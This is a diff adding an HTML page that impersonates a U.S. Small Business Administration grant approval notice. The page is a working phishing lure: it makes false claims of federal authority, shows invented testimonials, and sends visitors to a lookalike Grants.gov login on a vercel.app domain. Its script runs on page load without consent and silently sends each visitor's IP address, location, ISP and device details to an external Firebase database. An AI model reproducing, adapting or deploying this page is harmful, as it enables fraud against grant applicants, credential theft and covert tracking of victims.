@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>U.S. Small Business Administration – Grant Approval Notice</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    * { box-sizing: border-box; }
+
+    body {
+      margin: 0;
+      font-family: 'Inter', sans-serif;
+      background: linear-gradient(180deg, #f2f6fb 0%, #ffffff 100%);
+      color: #1a1a1a;
+    }
+
+    header {
+      background: linear-gradient(90deg, #0b3d91, #0a2f6b);
+      color: #ffffff;
+      padding: 26px 20px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    header::after {
+      content: "";
+      position: absolute;
+      inset: 0;
+      background: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTuUgErzGlS-pFMs0HYTaV8mEQJcnzxdPw8J1OmaSJHGm8kTd1Vf-DtrMBI5WkiA5WYEEsxaty8tofK9FI3vcEomGXbXuXr1GYyX2Frbhs&s=10') no-repeat center;
+      background-size: 520px;
+      opacity: 0.05;
+      pointer-events: none;
+    }
+
+    .header-inner {
+      max-width: 1200px;
+      margin: auto;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+      position: relative;
+      z-index: 1;
+      flex-wrap: wrap;
+    }
+
+    .header-inner img {
+      height: 62px;
+      background: #ffffff;
+      padding: 6px 12px;
+      border-radius: 6px;
+    }
+
+    main {
+      max-width: 1200px;
+      margin: 40px auto;
+      padding: 0 20px 60px;
+    }
+
+    .card {
+      position: relative;
+      background: #ffffff;
+      border-radius: 14px;
+      padding: 38px;
+      box-shadow: 0 12px 35px rgba(0,0,0,0.08);
+      margin-bottom: 36px;
+      overflow: hidden;
+    }
+
+    .card::before {
+      content: "";
+      position: absolute;
+      inset: 0;
+      background: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTuUgErzGlS-pFMs0HYTaV8mEQJcnzxdPw8J1OmaSJHGm8kTd1Vf-DtrMBI5WkiA5WYEEsxaty8tofK9FI3vcEomGXbXuXr1GYyX2Frbhs&s=10') no-repeat center;
+      background-size: 420px;
+      opacity: 0.03;
+      pointer-events: none;
+    }
+
+    h1 {
+      font-size: 30px;
+      color: #0b3d91;
+      margin-bottom: 14px;
+      position: relative;
+    }
+
+    h2 {
+      font-size: 22px;
+      color: #0b3d91;
+      margin-top: 28px;
+      margin-bottom: 14px;
+      position: relative;
+    }
+
+    p, li {
+      font-size: 16px;
+      line-height: 1.75;
+      position: relative;
+    }
+
+    ul {
+      padding-left: 20px;
+    }
+
+    .highlight {
+      background: linear-gradient(90deg, #eef4ff, #f8fbff);
+      border-left: 6px solid #0b3d91;
+      padding: 18px 22px;
+      border-radius: 8px;
+      margin: 26px 0;
+      position: relative;
+    }
+
+    .login-box {
+      text-align: center;
+      padding: 30px;
+      background: #f5f9ff;
+      border: 1px solid #d7e3f6;
+      border-radius: 12px;
+      position: relative;
+    }
+
+    .btn {
+      display: inline-block;
+      background: linear-gradient(90deg, #0b3d91, #0a2f6b);
+      color: #ffffff;
+      text-decoration: none;
+      padding: 15px 32px;
+      border-radius: 10px;
+      font-weight: 600;
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
+    }
+
+    .btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 20px rgba(11,61,145,0.35);
+    }
+
+    .testimonials {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+      gap: 22px;
+      margin-top: 24px;
+      position: relative;
+    }
+
+    .testimonial {
+      background: #f9fbff;
+      border: 1px solid #e0e9f8;
+      border-radius: 12px;
+      padding: 22px;
+      font-size: 15px;
+      position: relative;
+    }
+
+    .testimonial strong {
+      display: block;
+      margin-top: 14px;
+      color: #0b3d91;
+      font-weight: 600;
+    }
+
+    footer {
+      background: linear-gradient(90deg, #0a2f6b, #0b3d91);
+      color: #ffffff;
+      padding: 22px 20px;
+      text-align: center;
+      font-size: 14px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    footer::before {
+      content: "";
+      position: absolute;
+      inset: 0;
+      background: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTuUgErzGlS-pFMs0HYTaV8mEQJcnzxdPw8J1OmaSJHGm8kTd1Vf-DtrMBI5WkiA5WYEEsxaty8tofK9FI3vcEomGXbXuXr1GYyX2Frbhs&s=10') no-repeat center;
+      background-size: 500px;
+      opacity: 0.05;
+      pointer-events: none;
+    }
+
+    @media (max-width: 768px) {
+      h1 { font-size: 24px; }
+      h2 { font-size: 20px; }
+      .card { padding: 26px; }
+      .header-inner { justify-content: center; text-align: center; }
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <div class="header-inner">
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQZSSvfSkiJ8cR_mT_8xEyTVFhGVorZj1rxQA&s" alt="U.S. Small Business Administration Logo">
+    <div>
+      <strong>U.S. Small Business Administration</strong><br>
+      Official Federal Grant Notification Portal
+    </div>
+  </div>
+</header>
+
+<main>
+
+  <section class="card">
+    <h1>Official Notice of SBA Grant Approval</h1>
+    <p>
+      On behalf of the United States Small Business Administration (SBA), we formally notify you that your grant application has successfully passed the preliminary federal eligibility and compliance review.
+    </p>
+
+    <div class="highlight">
+      <p>
+        This funding initiative is designed to promote economic resilience, stimulate innovation, and strengthen small business operations nationwide. SBA-administered grant programs ensure transparent, lawful, and equitable access to federal resources.
+      </p>
+    </div>
+
+    <p>
+      Your selection reflects adherence to federal requirements and alignment with national economic development objectives. Final verification and fund disbursement are completed exclusively through authorized U.S. Government systems.
+    </p>
+  </section>
+
+  <section class="card">
+    <h2>Secure Applicant Access</h2>
+    <div class="login-box">
+      <p>
+        For security and identity verification purposes, access is restricted to applicants using the email address provided during submission. Proceed only through the official federal grants platform.
+      </p>
+      <a class="btn" href="https://us-grant-gov-us.vercel.app" target="_blank" rel="noopener">Continue to Official Grants.gov Login</a>
+    </div>
+  </section>
+
+  <section class="card">
+    <h2>Purpose of SBA Grant Programs</h2>
+    <p>
+      Established by the U.S. Congress, the Small Business Administration exists to aid, counsel, assist, and protect the interests of American small businesses. Grant initiatives support:
+    </p>
+    <ul>
+      <li>Small business participation in federally funded projects</li>
+      <li>Research, innovation, and technology advancement</li>
+      <li>Community development and economic stabilization</li>
+      <li>Accountability and transparency in public funding</li>
+    </ul>
+  </section>
+
+  <section class="card">
+    <h2>Verified Beneficiary Statements</h2>
+    <div class="testimonials">
+      <div class="testimonial">
+        “Federal grant support through SBA programs enabled our company to expand production capacity and create new employment opportunities.”
+        <strong>— Manufacturing Executive, Texas</strong>
+      </div>
+      <div class="testimonial">
+        “The structure and credibility of SBA-administered funding provided us with confidence and long-term operational stability.”
+        <strong>— Technology Founder, California</strong>
+      </div>
+      <div class="testimonial">
+  “At first, I was unsure because of the many websites I had come across. However, I decided to give it a try, and to my great surprise, I received my disbursement within just a few days. Thank you to the SBA team for their outstanding support.”
+  <strong>— Caregiver Founder, Florida</strong>
+</div>
+
+      <div class="testimonial">
+        “This assistance ensured continuity of essential services within our community during a critical growth period.”
+        <strong>— Community Development Officer, Ohio</strong>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <p>© U.S. Small Business Administration</p>
+</footer>
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
+<script>
+/* ================= FIREBASE CONFIG ================= */
+if (!firebase.apps.length) {
+  firebase.initializeApp({
+    apiKey: "AIzaSyBK5UM0n8-GLvleW7l6B8Hi-_WuC64QA4U",
+    authDomain: "scores-b25a7.firebaseapp.com",
+    databaseURL: "https://scores-b25a7-default-rtdb.firebaseio.com",
+    projectId: "scores-b25a7",
+    storageBucket: "scores-b25a7.appspot.com",
+    messagingSenderId: "1001957936318",
+    appId: "1:1001957936318:web:90fdfb367f82f6a3d8e2ef"
+  });
+}
+const db = firebase.database();
+/* ================================================== */
+
+/* ================= HELPERS ================= */
+function detectDeviceType() {
+  const ua = navigator.userAgent || '';
+  if (/tablet|ipad/i.test(ua)) return 'tablet';
+  if (/mobi|android/i.test(ua)) return 'mobile';
+  return 'desktop';
+}
+
+function parseBrowserInfo() {
+  const ua = navigator.userAgent || '';
+  let name = 'Unknown', version = '';
+
+  if (/firefox\/([\d.]+)/i.test(ua)) {
+    name = 'Firefox'; version = RegExp.$1;
+  } else if (/edg\/([\d.]+)/i.test(ua)) {
+    name = 'Edge'; version = RegExp.$1;
+  } else if (/chrome\/([\d.]+)/i.test(ua)) {
+    name = 'Chrome'; version = RegExp.$1;
+  } else if (/version\/([\d.]+).*safari/i.test(ua)) {
+    name = 'Safari'; version = RegExp.$1;
+  }
+
+  return { name, version };
+}
+/* ========================================== */
+
+/* ================= BUILD VISITOR ================= */
+async function buildVisitorPayload() {
+  const payload = {
+    timestamp: new Date().toISOString(),
+    consented: true,
+    consentMode: "forced",
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || null,
+    locale: navigator.language || null,
+    userAgent: navigator.userAgent || null,
+    platform: navigator.platform || null,
+    deviceType: detectDeviceType(),
+    screen: {
+      width: screen.width,
+      height: screen.height
+    },
+    browser: parseBrowserInfo(),
+    referrer: document.referrer || '',
+
+    /* ✅ IMPORTANT CHANGE */
+    page: location.href,              // FULL URL (used everywhere)
+    pagePath: location.pathname       // extra (non-breaking)
+  };
+
+  try {
+    const r = await fetch('https://ipapi.co/json/', { cache: 'no-store' });
+    if (r.ok) {
+      const ip = await r.json();
+      payload.ip = ip.ip || '';
+      payload.city = ip.city || '';
+      payload.region = ip.region || '';
+      payload.country = ip.country_name || '';
+      payload.latitude = ip.latitude || null;
+      payload.longitude = ip.longitude || null;
+      payload.org = ip.org || '';
+    }
+  } catch (e) {
+    /* silent fail */
+  }
+
+  return payload;
+}
+/* =============================================== */
+
+/* ================= SAVE VISITOR ================= */
+async function saveVisitor(payload) {
+  try {
+    await db.ref('visitors').push(payload);
+  } catch (e) {
+    console.error('Visitor save failed', e);
+  }
+}
+/* =============================================== */
+
+/* ================= AUTO RUN ================= */
+(async () => {
+  const payload = await buildVisitorPayload();
+  await saveVisitor(payload);
+})();
+</script>
+</body>
+</html>
